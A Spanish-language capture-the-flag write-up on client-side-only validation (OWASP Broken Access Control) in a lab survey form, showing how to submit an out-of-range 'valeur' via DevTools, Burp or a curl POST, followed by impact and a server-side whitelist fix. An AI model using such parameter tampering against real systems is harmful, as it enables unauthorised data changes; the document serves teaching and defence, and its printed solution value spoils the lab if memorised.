# A5 - Broken Access Control

Vulnerabilidad del OWASP Top 10 (2017). En el apartado `survey`, un formulario con un `<select>` limita los valores del 1 al 10 solo en el cliente. El servidor no valida que el valor recibido pertenezca a ese rango.

---

## Pasos para obtener la flag

### 1. Identificar el vector

El formulario envía un POST con el parámetro `valeur` restringido al rango 1-10 por el HTML, pero el servidor acepta cualquier valor sin validarlo.

### 2. Explotar

**Opción A – DevTools:**
1. F12 → inspeccionar el elemento `<select name="valeur">`.
2. Modificar el value de una opción existente a `4218.19`.
3. Seleccionarla y enviar el formulario → aparece la **flag**.

**Opción B – Burp Suite:**
Interceptar el POST y cambiar el parámetro:
```
valeur=4218.19
```

**Opción C – cURL:**
```bash
curl -X POST "http://<IP>/index.php?page=survey" \
     -d "valeur=4218.19&sujet=1"
```

---

## Impacto

- **Integridad:** el atacante modifica datos que no debería poder alterar.
- **Confidencialidad:** mediante escalada de privilegios se accede a información restringida.
- **Autorización débil:** confiar solo en validaciones del cliente es trivialmente eludible.

---

## Mitigación

1. **Validación en servidor con whitelist:**
   ```php
   $allowed = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
   if (!in_array($_POST['valeur'], $allowed)) die('Valor inválido');
   ```
2. **Nunca confiar en datos del cliente:** toda restricción de negocio debe aplicarse en el backend.
3. **Principio de mínimo privilegio:** validar en cada request que la acción está permitida para ese usuario.
4. **Logging:** registrar envíos con valores fuera del rango esperado.
